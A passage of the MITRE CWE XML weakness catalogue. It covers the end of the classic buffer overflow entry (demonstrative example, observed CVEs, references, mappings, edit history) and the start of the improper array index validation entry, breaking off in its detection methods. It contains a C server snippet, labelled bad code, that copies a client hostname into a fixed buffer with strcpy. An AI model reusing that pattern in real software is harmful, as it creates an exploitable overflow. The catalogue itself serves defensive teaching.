            <Demonstrative_Example>
               <Intro_Text>In the following example, a server accepts connections from a client
						and processes the client request. After accepting a client connection, the
						program will obtain client information using the gethostbyaddr method, copy
						the hostname of the client that connected to a local variable and output the
						hostname of the client to a log file.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>...</Code>
                     <Block>
                        <Code>struct hostent *clienthp;</Code>
                        <Code>char hostname[MAX_LEN];</Code>
                        <Code/>
                        <Code>// create server socket, bind to server address and listen on
									socket</Code>
                        <Code>...</Code>
                        <Code/>
                        <Code>// accept client connections and process requests</Code>
                        <Code>int count = 0;</Code>
                        <Code>for (count = 0; count &lt; MAX_CONNECTIONS; count++)
									{</Code>
                        <Block>
                           <Code/>
                           <Code>int clientlen = sizeof(struct sockaddr_in);</Code>
                           <Code>int clientsocket = accept(serversocket, (struct sockaddr
										*)&amp;clientaddr, &amp;clientlen);</Code>
                           <Code/>
                           <Code>if (clientsocket &gt;= 0) {</Code>
                           <Block>
                              <Code>clienthp = gethostbyaddr((char*)
											&amp;clientaddr.sin_addr.s_addr,
											sizeof(clientaddr.sin_addr.s_addr), AF_INET);</Code>
                              <Code>strcpy(hostname, clienthp-&gt;h_name);</Code>
                              <Code>logOutput("Accepted client connection from host ",
											hostname);</Code>
                              <Code/>
                              <Code>// process client request</Code>
                              <Code>...</Code>
                              <Code>close(clientsocket);</Code>
                           </Block>
                           <Code> }</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>close(serversocket);</Code>
                     </Block>
                     <Code>...</Code>
                  </Block>
                  <Text>However, the hostname of the client that connected may be longer than
							the allocated size for the local hostname variable. This will result in
							a buffer overflow when copying the client hostname to the local variable
							using the strcpy method.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2000-1094</Observed_Example_Reference>
               <Observed_Example_Description>buffer overflow using command with long
						argument</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-1999-0046</Observed_Example_Reference>
               <Observed_Example_Description>buffer overflow in local program using long
						environment variable</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1337</Observed_Example_Reference>
               <Observed_Example_Description>buffer overflow in comment characters, when
						product increments a counter for a "&gt;" but does not decrement for
						"&lt;"</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-0595</Observed_Example_Reference>
               <Observed_Example_Description>By replacing a valid cookie value with an
						extremely long string of characters, an attacker may overflow the
						application's buffers.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0191</Observed_Example_Reference>
               <Observed_Example_Description>By replacing a valid cookie value with an
						extremely long string of characters, an attacker may overflow the
						application's buffers.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Memory Management</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <References>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.120.1">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 5, "Public Enemy #1: The Buffer Overrun" Page
						127</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.120.2">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 5: Buffer Overruns." Page 89</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-27" Local_Reference_ID="R.120.3">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Using the Strsafe.h Functions</Reference_Title>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms647466.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-26" Local_Reference_ID="R.120.4">
               <Reference_Author>Matt Messier</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>Safe C String Library v1.0.3</Reference_Title>
               <Reference_Link>http://www.zork.org/safestr/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-22" Local_Reference_ID="R.120.5">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Address Space Layout Randomization in Windows
						Vista</Reference_Title>
               <Reference_Link>http://blogs.msdn.com/michael_howard/archive/2006/05/26/address-space-layout-randomization-in-windows-vista.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.120.6">
               <Reference_Author>Arjan van de Ven</Reference_Author>
               <Reference_Title>Limiting buffer overflows with ExecShield</Reference_Title>
               <Reference_Link>http://www.redhat.com/magazine/009jul05/features/execshield/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-29" Local_Reference_ID="R.120.7">
               <Reference_Title>PaX</Reference_Title>
               <Reference_Link>http://en.wikipedia.org/wiki/PaX</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.120.8">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 3 - Classic Buffer
						Overflow</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-02</Reference_Date>
               <Reference_Link>http://software-security.sans.org/blog/2010/03/02/top-25-series-rank-3-classic-buffer-overflow/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-25" Local_Reference_ID="R.120.9">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Understanding DEP as a mitigation technology part
						1</Reference_Title>
               <Reference_Link>http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.120.10">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.120.11">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 3, "Nonexecutable Stack", Page
						76.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.120.12">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 5, "Protection Mechanisms", Page
						189.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.120.13">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 8, "C String Handling", Page 388.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-37" Local_Reference_ID="R.120.14">
               <Reference_Author>Grant Murphy</Reference_Author>
               <Reference_Title>Position Independent Executables (PIE)</Reference_Title>
               <Reference_Publisher>Red Hat</Reference_Publisher>
               <Reference_Date>2012-11-28</Reference_Date>
               <Reference_Link>https://securityblog.redhat.com/2012/11/28/position-independent-executables-pie/</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Unbounded Transfer ('classic overflow')</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Buffer Overflow</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Buffer overflow</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Unvalidated Input</Mapped_Node_Name>
               <Mapped_Node_ID>A1</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Buffer Overflows</Mapped_Node_Name>
               <Mapped_Node_ID>A5</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Do not copy data from an unbounded source to a fixed-length
						array</Mapped_Node_Name>
               <Mapped_Node_ID>STR35-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Buffer Overflow </Mapped_Node_Name>
               <Mapped_Node_ID>7</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not copy data from an unbounded source to a fixed-length
						array</Mapped_Node_Name>
               <Mapped_Node_ID>STR35-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Faulty Buffer Access</Mapped_Node_Name>
               <Mapped_Node_ID>SFP8</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <White_Box_Definitions>
            <White_Box_Definition>
               <Text>A weakness where the code path includes a Buffer Write Operation such
						that:</Text>
               <Block>
                  <Text>1. the expected size of the buffer is greater than the actual size of
							the buffer where expected size is equal to the sum of the size of the
							data item and the position in the buffer</Text>
               </Block>
               <Text>Where Buffer Write Operation is a statement that writes a data item of a
						certain size into a buffer at a certain position and at a certain
						index</Text>
            </White_Box_Definition>
         </White_Box_Definitions>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>10</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>100</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>14</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>24</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>42</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>44</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>45</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>46</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>47</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>67</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>8</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>9</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>92</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>KDM Analytics</Modifier_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms,
						Common_Consequences, Relationships, Observed_Example, Other_Notes,
						Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-10</Modification_Date>
               <Modification_Comment>Changed name and description to more clearly emphasize the
						"classic" nature of the overflow.</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Name, Other_Notes,
						Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes,
						Potential_Mitigations, References, Relationship_Notes,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Other_Notes, Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Demonstrative_Examples, Detection_Factors, Potential_Mitigations,
						References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings,
						Time_of_Introduction, Type</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-10-14">Unbounded Transfer ('Classic
						Buffer Overflow')</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="129" Name="Improper Validation of Array Index" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The product uses untrusted input when calculating or using an
					array index, but the product does not validate or incorrectly validates the
					index to ensure the index references a valid position within the array.
				</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>823</Relationship_Target_ID>
               <!--Use of Out-of-range Pointer Offset--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>789</Relationship_Target_ID>
               <!--Uncontrolled Memory Allocation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>189</Relationship_Target_ID>
               <!--Numeric Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">631</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>633</Relationship_Target_ID>
               <!--Weaknesses that Affect Memory--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>738</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>740</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 06 - Arrays (ARR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>872</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>874</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 06 - Arrays and the STL (ARR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>970</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Faulty Buffer Access--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This weakness can precede uncontrolled memory allocation (CWE-789) in
						languages that automatically expand an array when an index is used that is
						larger than the size of the array, such as JavaScript.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Ordinality_Description>
                  <Text>The most common condition situation leading to an out-of-bounds array
							index is the use of loop index variables as buffer indexes. If the end
							condition for the loop is subject to a flaw, the index can grow or
							shrink unbounded, therefore causing a buffer overflow or underflow.
							Another common situation leading to this condition is the use of a
							function's return value, or the resulting value of a calculation
							directly as an index in to a buffer.</Text>
               </Ordinality_Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C" Prevalence="Often"/>
               <Language Language_Name="C++" Prevalence="Often"/>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>out-of-bounds array index</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>index-out-of-range</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>array index underflow</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Use of an index that is outside the bounds of an array will very
							likely result in the corruption of relevant memory and perhaps
							instructions, leading to a crash, if the values are outside of the valid
							memory area.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the memory corrupted is data, rather than instructions, the system
							will continue to function with improper values.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify memory</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Use of an index that is outside the bounds of an array can also
							trigger out-of-bounds read or write operations, or operations on the
							wrong objects; i.e., "buffer overflows" are not always the result. This
							may result in the exposure or modification of sensitive data.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the memory accessible by the attacker can be effectively
							controlled, it may be possible to execute arbitrary code, as with a
							standard buffer overflow and possibly without the use of large inputs if
							a precise index can be controlled.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read memory</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>A single fault could allow either an overflow (CWE-788) or underflow
							(CWE-786) of the array index. What happens next will depend on the type
							of operation being performed out of bounds, but can expose sensitive
							information, cause a system crash, or possibly lead to arbitrary code
							execution.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
                  <Text>Automated static analysis generally does not account for environmental
							considerations when reporting out-of-bounds memory operations. This can
							make it difficult for users to determine which warnings should be
							investigated first. For example, an analysis tool might report array
							index errors that originate from command line arguments in a program
							that is not expected to run with setuid or other special
							privileges.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>This is not a perfect solution, since 100% accuracy and coverage are
							not feasible.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
            </Detection_Method>
